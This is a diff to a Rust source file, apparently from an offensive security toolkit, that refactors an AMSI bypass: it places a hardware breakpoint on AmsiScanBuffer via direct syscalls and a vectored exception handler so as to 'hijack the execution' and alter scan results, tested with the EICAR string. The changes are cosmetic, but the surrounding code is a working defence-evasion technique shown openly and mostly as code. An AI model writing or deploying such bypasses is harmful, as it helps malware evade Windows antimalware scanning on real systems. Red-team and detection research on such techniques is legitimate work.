@@ -5,56 +5,41 @@ use std::ffi::CString;
 use std::mem::transmute;
 use std::ptr::null_mut;
 
-use ntapi::ntpsapi::{NtCurrentThread, NtGetContextThread};
 use winapi::{
 	ctypes::c_void,
-	shared::minwindef::ULONG,
 	shared::ntdef::HRESULT,
 	um::{
 		errhandlingapi::AddVectoredExceptionHandler,
 		libloaderapi::LoadLibraryA,
-		winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS, HANDLE, PVOID}
+		winnt::CONTEXT,
+		winnt::CONTEXT_DEBUG_REGISTERS,
+		winnt::HANDLE,
 	}
 };
 
-use thermite::{debug, direct_syscall, error, info};
-use thermite::breakpoints::{DebugRegister, get_arguments, register_callback, rip_to_return_address, set_breakpoint, set_resume_flag, set_ret_value};
+use thermite::{direct_syscall, error, info};
+use thermite::breakpoints::{DebugRegister, get_arguments, register_callback, rip_to_return_address, set_resume_flag, set_ret_value};
 use thermite::peb_walk::{get_function_address, get_module_handle};
 
 
-pub type HAMSICONTEXT = *mut c_void;
-pub type HAMSISESSION = *mut c_void;
-pub type AMSI_RESULT = i32;
-pub type LPCWSTR = *const u16;
-pub type LPCVOID = *const c_void;
-
 #[link(name="amsi")]
 extern "system" {
-	pub fn AmsiInitialize(appName: LPCWSTR, amsiContext: *mut HAMSICONTEXT) -> HRESULT;
-	pub fn AmsiUninitialize(amsiContext: HAMSICONTEXT);
-	pub fn AmsiOpenSession(amsiContext: HAMSICONTEXT, amsiSession: *mut HAMSISESSION) -> HRESULT;
-	pub fn AmsiCloseSession(amsiContext: HAMSICONTEXT, amsiSession: HAMSISESSION);
-	pub fn AmsiScanBuffer(
-		amsiContext: HAMSICONTEXT,
-		buffer: LPCVOID,
-		length: ULONG,
-		contentName: LPCWSTR,
-		session: HAMSISESSION,
-		result: *mut AMSI_RESULT
-	) -> HRESULT;
+	pub fn AmsiInitialize(appName: *const u16, amsiContext: *mut HANDLE) -> HRESULT;
+	pub fn AmsiUninitialize(amsiContext: HANDLE);
+	pub fn AmsiOpenSession(amsiContext: HANDLE, amsiSession: *mut HANDLE) -> HRESULT;
+	pub fn AmsiCloseSession(amsiContext: HANDLE, amsiSession: HANDLE);
+	pub fn AmsiScanBuffer(amsiContext: HANDLE, buffer: *const c_void, length: u32, contentName: *const u16, session: HANDLE, result: *mut i32) -> HRESULT;
 }
 
 
 // This function sets up the hardware breakpoint
 // It will load AMSI.dll if it is not already loaded, so it can find the address of AmsiScanBuffer
 // Then set up a hook with hardware breakpoints at the function's address, so we can hijack the execution
-fn setup() -> Result<PVOID, String> {
+fn setup() -> Result<*mut c_void, String> {
 	let amsiscanbuffer_handle: *const u8;
 	let mut thread_ctx: CONTEXT = unsafe { std::mem::zeroed() };
 	thread_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-
-	// debug!(std::mem::align_of::<HANDLE>());
-
+	
 	let status = direct_syscall!("NtGetContextThread", -2i32 as HANDLE, &mut thread_ctx);
 	if status != 0 { return Err(format!("Failed to get context thread: {status:x}")) };
 
@@ -79,7 +64,7 @@ fn setup() -> Result<PVOID, String> {
 	unsafe { register_callback(DebugRegister::DR0, transmute(callback as fn(_))); }
 
 	// Set the context - "Saves" our breakpoints
-	let status = direct_syscall!("NtSetContextThread", NtCurrentThread, &mut thread_ctx);
+	let status = direct_syscall!("NtSetContextThread", -2isize, &mut thread_ctx);
 	if status != 0 { return Err(format!("Failed to set context thread: {status:x}")) };
 	Ok(veh)
 }
@@ -95,7 +80,7 @@ fn scan_sample(amsi_ctx: *mut c_void, amsi_session: *mut c_void, mut res: HRESUL
 	unsafe { AmsiScanBuffer(
 		amsi_ctx,
 		eicar_string.as_ptr() as *const c_void,
-		eicar_string.len() as ULONG,
+		eicar_string.len() as u32,
 		name_utf16.as_ptr(),
 		amsi_session,
 		&mut res) };
